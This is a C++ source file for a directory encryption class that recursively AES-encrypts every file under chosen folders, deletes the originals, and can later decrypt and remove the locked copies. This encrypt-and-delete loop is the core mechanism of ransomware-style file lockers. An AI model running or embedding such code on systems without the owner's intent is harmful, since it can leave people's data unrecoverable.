#include "dir_cryptor.h"
#include "../w_aes/aes_manager.h"



DirCryptor::DirCryptor( const std::vector<const std::string> dirPaths )
{
  for( auto itr : dirPaths )
	_dirPaths.push_back( itr );
}

DirCryptor::DirCryptor( const std::vector<const std::string> dirPaths , openssl_wrapper::aes::W_AESKey_128* key ) : _key(key)
{
  for( auto itr : dirPaths )
	_dirPaths.push_back( itr );
  return;
}

void DirCryptor::claerLockedFile()
{
  unsigned int count = 0;
  for( auto itr : _dirPaths )
  {
	for( const fs::directory_entry& entry : fs::recursive_directory_iterator(itr) )
	{
	  if( fs::is_regular_file(entry) && entry.path().extension() == LockedExtension ){
		std::string entryPath = entry.path().string();
		fs::remove(entry);
		std::cout << entryPath << " - " << "\x1b[31m" << "delete" << "\x1b[39m" << "\n";
		count++;
	  }
	}
  }

  std::cout << "\n\n" << "deleted :: " << count << " files" << "\n\n";
}

void DirCryptor::init()
{
  for( auto itr : _dirPaths )
	std::cout << fs::exists(itr) << "\n";
  for( auto itr : _dirPaths )
	std::cout << fs::is_directory(itr) << "\n";

  for( auto itr : _dirPaths ) {
	const auto rDirItr = fs::recursive_directory_iterator(itr);
	for( auto _itr : rDirItr )
	{
	  std::cout << _itr.path().string() << "\x1b[31m" << " - raw" << "\x1b[39m" << "\n";
	}
  }

  _encryptFlag = true;
}



bool DirCryptor::encryptFile( const fs::directory_entry& entry )
{
  if( !(fs::is_regular_file(entry)) ) return false;

  size_t encryptedLength = 0;
  std::string lockedFilePath = entry.path().string() + LockedExtension;
  encryptedLength = openssl_wrapper::aes::W_AES128Manager::encryptStream( entry.path().string() , 0, 0, _key, lockedFilePath );
  
  return (encryptedLength != 0) ;
}

bool DirCryptor::decryptFile( const fs::directory_entry& entry )
{
  if( !(fs::is_regular_file(entry) )) return false;

  size_t decryptedLength;
  std::string unLockedFilePath = entry.path().parent_path().string() + "/" + entry.path().stem().string();

  decryptedLength = openssl_wrapper::aes::W_AES128Manager::decryptStream( entry.path().string() , 0 , 0 , _key, unLockedFilePath );

  return (decryptedLength != 0);
}


bool DirCryptor::startEncrypt()
{
  unsigned int count = 0;
  for( auto itr : _dirPaths ){
	for( const fs::directory_entry& entry : fs::recursive_directory_iterator(itr) )
	{
	  if( this->encryptFile( entry ) )
	  {
		std::cout << entry.path().string() << " - " << "\x1b[32m" << "lock" << "\x1b[39m" << "\n";
		fs::remove( entry );
		count++;
	  }
	}
  }


  std::cout << "\n\n" << "locked :: " << count << " files" << "\n\n";
  return true;
}


bool DirCryptor::startDecrypt()
{
  unsigned int count = 0;
  for( auto itr : _dirPaths )
  {
	for( const fs::directory_entry& entry : fs::recursive_directory_iterator(itr) )
	{
	  if( entry.path().extension() == LockedExtension )
	  {
		if( this->decryptFile( entry ) )
		{
		  std::cout << entry.path().string() << " - " << "\x1b[34m" << "unlock" << "\x1b[39m" << "\n";
		  fs::remove( entry );
		  count++;
		}
	  }
	}
  }

  std::cout << "\n\n" << "unlocked :: " << count << " files" << "\n\n";
  return true;
}
